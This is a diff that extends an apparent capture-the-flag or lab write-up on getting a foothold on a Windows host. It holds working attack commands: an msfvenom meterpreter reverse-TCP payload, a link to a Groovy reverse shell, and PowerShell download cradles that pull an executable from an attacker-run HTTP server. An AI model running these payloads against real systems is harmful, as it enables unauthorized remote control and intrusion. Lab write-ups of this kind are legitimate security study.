@@ -211,3 +211,36 @@ To make the privilege escalation easier, let's switch to a meterpreter shell usi
 Use msfvenom to create a Windows meterpreter reverse shell using the following payload:
 
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
+
+So starters quick reverse shell back in using groovy instead it appears easier, here is one link for a classic groovy reverse shell:
+https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+Its the same as reverse shell rom revshells.com, except String cmd="sh" is String cmd="cmd.exe" and of course change ip and port as normal.
+
+This method of reverse shell is terribly unstable. The other issue is that CMD shell does not support copying by port number so 
+```
+copy //ip/folder/file file
+```
+wont work no matter what port. Powershell has the invoke-webrequest command, SMB does not support ports, 445 wont work here. Using powershell command from cmd shell wont work either: 
+```
+powershell -command "Invoke-WebRequest -Uri http://10.48.107.215:8000/shell-name.exe -OutFile shell-name.exe"
+```
+Here’s the key point:
+- CMD can launch PowerShell
+- PowerShell can run Invoke-WebRequest
+- But Invoke-WebRequest is disabled or restricted on many Windows systems
+This is usually due to:
+- Execution policy restrictions
+- PowerShell 2.0 being used instead of 5+
+- Missing TLS support
+- Network restrictions
+- SmartScreen / Defender blocking the download
+- Corporate policy disabling web requests
+
+So here I am back to nishang for this task.
+
+reset the reverse shell. 
+- Uploaded payload with python3 -m http.server.
+- Downloaded using:
+```
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.48.107.215:8000/shell-name.exe','shell-name.exe')"
+```
